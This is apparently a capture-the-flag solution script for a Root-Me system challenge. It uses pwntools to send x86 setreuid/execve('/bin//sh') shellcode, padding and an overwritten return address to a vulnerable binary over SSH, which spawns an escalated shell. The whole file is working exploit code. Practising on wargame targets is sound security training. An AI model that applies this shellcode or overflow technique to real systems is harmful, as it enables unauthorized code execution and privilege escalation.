from pwn import*

username = 0x0804a040
BUF_SIZE = 512

shellcode = b"\x6A\x46\x58\x66\xBB\xB7\x04\x66\xB9\x53\x04\xCD\x80\x31\xD2\x6A\x0B\x58\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\xCD\x80"

payload = shellcode
payload += b"A" *(BUF_SIZE - len(shellcode))
payload += p32(0x0804a040)

s = ssh(host='challenge02.root-me.org' ,user='app-systeme-ch7' ,password='app-systeme-ch7',port=2222)
p = s.process(["./ch7", payload])
p.interactive()
